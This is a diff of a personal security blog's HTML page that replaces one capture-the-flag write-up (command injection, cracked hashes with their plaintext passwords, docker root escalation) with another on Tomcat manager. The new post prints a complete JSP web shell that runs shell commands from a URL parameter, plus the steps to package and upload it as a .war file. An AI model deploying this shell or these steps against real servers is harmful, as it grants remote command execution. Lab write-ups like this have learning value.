@@ -4,11 +4,11 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">ultratech | Cyber Blog-ul lui Novac</title>
-<meta property="og:title" content="ultratech | Cyber Blog-ul lui Novac" />
-<meta name="twitter:title" content="ultratech | Cyber Blog-ul lui Novac" />
-<meta itemprop="name" content="ultratech | Cyber Blog-ul lui Novac" />
-<meta name="application-name" content="ultratech | Cyber Blog-ul lui Novac" />
+<title itemprop="name">manager-tomcat | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="manager-tomcat | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="manager-tomcat | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="manager-tomcat | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="manager-tomcat | Cyber Blog-ul lui Novac" />
 <meta property="og:site_name" content="" />
 
 <meta name="description" content="">
@@ -19,7 +19,7 @@
 <meta property="og:locale" content="ro-ro" />
 <meta name="language" content="ro-ro" />
 
-  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/ultratech/" title="" />
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/manager-tomcat/" title="" />
 
 
 
@@ -30,9 +30,9 @@
     
 
     <meta property="og:type" content="article" />
-    <meta property="og:article:published_time" content=2026-07-20T09:15:34Z />
-    <meta property="article:published_time" content=2026-07-20T09:15:34Z />
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/ultratech/" />
+    <meta property="og:article:published_time" content=2026-05-10T10:52:51Z />
+    <meta property="article:published_time" content=2026-05-10T10:52:51Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/manager-tomcat/" />
 
     
 
@@ -42,16 +42,16 @@
     {
         "@context": "http://schema.org",
         "@type": "Article",
-        "headline": "ultratech",
+        "headline": "manager-tomcat",
         "author": {
         "@type": "Person",
         "name": ""
         },
-        "datePublished": "2026-07-20",
+        "datePublished": "2026-05-10",
         "description": "",
-        "wordCount":  208 ,
+        "wordCount":  111 ,
         "mainEntityOfPage": "True",
-        "dateModified": "2026-07-20",
+        "dateModified": "2026-05-10",
         "image": {
         "@type": "imageObject",
         "url": ""
@@ -67,45 +67,40 @@
 <meta name="generator" content="Hugo 0.161.1">
 
     
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/ultratech/">
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/manager-tomcat/">
   <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
-  <meta property="og:title" content="ultratech">
-  <meta property="og:description" content="scaning:
-this nmap scan gives us all we need for the first page so the first page is done .
-i also runned a feq gobuster scans and found a few interesting domains ,
-one of them being /js which quiet interesting , and inside it the api.js file , what grabbed my attention was ping line
-robots.txt gives a map
-trying some parameter checking here
-here i just tried a few random things like acces that note.js port and using the ping ip parameter we saw in that file earlier i was eable to get RCE
-i tried to do some reverse shell script but it didnt worked
-so i just listed the password file
-inside it i found 2 passwords hashes and both of them where on crackstation">
+  <meta property="og:title" content="manager-tomcat">
+  <meta property="og:description" content="access the site first time:
+look at the image source
+looks like LFI , do some path traversal in burp and get the pass of user tomcat
+log in with the password at /manager
+inside we get a file upload menu , the file need to be in .war format
+create shell : nano shell.jsp COPY-PSTE THIS &lt;%@ page import=&#34;java.io.*&#34; %&gt; &lt;% String cmd = request.getParameter(&#34;cmd&#34;); if (cmd != null) { Process p = Runtime.getRuntime().exec(new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, cmd}); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { out.println(line &#43; &#34;&lt;br&gt;&#34;); } } %&gt; SAVE EXIT zip exploit.war shell.jsp A now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag">
   <meta property="og:locale" content="ro_ro">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:modified_time" content="2026-07-20T09:15:34+00:00">
+    <meta property="article:modified_time" content="2026-05-10T10:52:51+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
     <meta property="article:tag" content="CyberStuff">
+    <meta property="article:tag" content="Dreamhack">
 
 
     
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="ultratech">
-  <meta name="twitter:description" content="scaning:
-this nmap scan gives us all we need for the first page so the first page is done .
-i also runned a feq gobuster scans and found a few interesting domains ,
-one of them being /js which quiet interesting , and inside it the api.js file , what grabbed my attention was ping line
-robots.txt gives a map
-trying some parameter checking here
-here i just tried a few random things like acces that note.js port and using the ping ip parameter we saw in that file earlier i was eable to get RCE
-i tried to do some reverse shell script but it didnt worked
-so i just listed the password file
-inside it i found 2 passwords hashes and both of them where on crackstation">
+  <meta name="twitter:title" content="manager-tomcat">
+  <meta name="twitter:description" content="access the site first time:
+look at the image source
+looks like LFI , do some path traversal in burp and get the pass of user tomcat
+log in with the password at /manager
+inside we get a file upload menu , the file need to be in .war format
+create shell : nano shell.jsp COPY-PSTE THIS &lt;%@ page import=&#34;java.io.*&#34; %&gt; &lt;% String cmd = request.getParameter(&#34;cmd&#34;); if (cmd != null) { Process p = Runtime.getRuntime().exec(new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, cmd}); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { out.println(line &#43; &#34;&lt;br&gt;&#34;); } } %&gt; SAVE EXIT zip exploit.war shell.jsp A now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag">
 
 
     
 
-    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/ultratech/">
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/manager-tomcat/">
     <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
     <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -217,71 +212,54 @@ stroke-linejoin="round" class="feather feather-home">
     <main class="page-content" aria-label="Content">
         <article>
             <header class="header">
-                <h1 class="header-title">ultratech</h1>
+                <h1 class="header-title">manager-tomcat</h1>
                 
                 
                 
                 <div class="post-meta">
-                    <time datetime="2026-07-20T09:15:34&#43;00:00" itemprop="datePublished"> 20 iul. 2026 </time>
+                    <time datetime="2026-05-10T10:52:51&#43;00:00" itemprop="datePublished"> 10 mai 2026 </time>
                 </div>
                 
             </header>
             
             <div class="page-content">
-                <p>scaning:<br>
-this nmap scan gives us all we need for the first page <img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084750.png" alt="">
+                <p>access the site first time:<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064219.png" alt="">
 <br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303084834.png" alt="">
-</p>
-<p>so the first page is done .<br>
-i also runned a feq gobuster scans and found a few interesting domains ,<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144740.png" alt="">
+look at the image source<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064234.png" alt="">
 <br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303144808.png" alt="">
+looks like LFI , do some path traversal in burp and get the pass of user tomcat<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260510060750.png" alt="">
 <br>
-one of them being /js which quiet interesting  , and inside it the api.js file , what grabbed my attention was ping line<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303094618.png" alt="">
-</p>
-<p>robots.txt gives a map<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303091608.png" alt="">
-</p>
-<p>trying some parameter checking here<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303092052.png" alt="">
-</p>
-<p>here i just tried a few random things like acces that note.js port and using the ping ip parameter we saw in that file earlier i was eable to get RCE<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303095427.png" alt="">
+log in with the password at /manager<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260510065249.png" alt="">
 <br>
-i tried to do some reverse shell script but it didnt worked<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303102305.png" alt="">
-<br>
-so i just listed the password file<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303103444.png" alt="">
-<br>
-inside it i found 2 passwords hashes and both of them where on crackstation</p>
-<pre tabindex="0"><code>���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
-</code></pre><p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303103535.png" alt="">
-<br>
-mrsheafy<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303104008.png" alt="">
-<br>
-n100906<br>
-then i just ssh with the first username and pass<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303105519.png" alt="">
-<br>
-inside i tried to list some SUID or sudo but didnt find anything interesting<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303105512.png" alt="">
-<br>
-but when i id i saw a have some docker permisions on , ok that cool<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303105912.png" alt="">
-<br>
-so i search on GTFO.bins a priv esec using docker and found this<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303110133.png" alt="">
-<br>
-run it and boom root acces , room done<br>
-<img src="blog-ul-meu/static/Pasted%20image%2020260303110124.png" alt="">
-<br>
-just cat the ssh as in the question<br>
-<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260303110159.png" alt="">
+inside we get a file upload menu , the file need to be in .war format</p>
+<pre tabindex="0"><code>create shell :
+</code></pre><pre tabindex="0"><code>
+nano shell.jsp
+
+COPY-PSTE THIS
+
+&lt;%@ page import=&#34;java.io.*&#34; %&gt;
+&lt;%
+    String cmd = request.getParameter(&#34;cmd&#34;);
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, cmd});
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            out.println(line + &#34;&lt;br&gt;&#34;);
+        }
+    }
+%&gt;
+
+SAVE EXIT 
+
+zip exploit.war shell.jsp A
+</code></pre><p>now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag<br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260510064024.png" alt="">
 </p>
 
             </div>
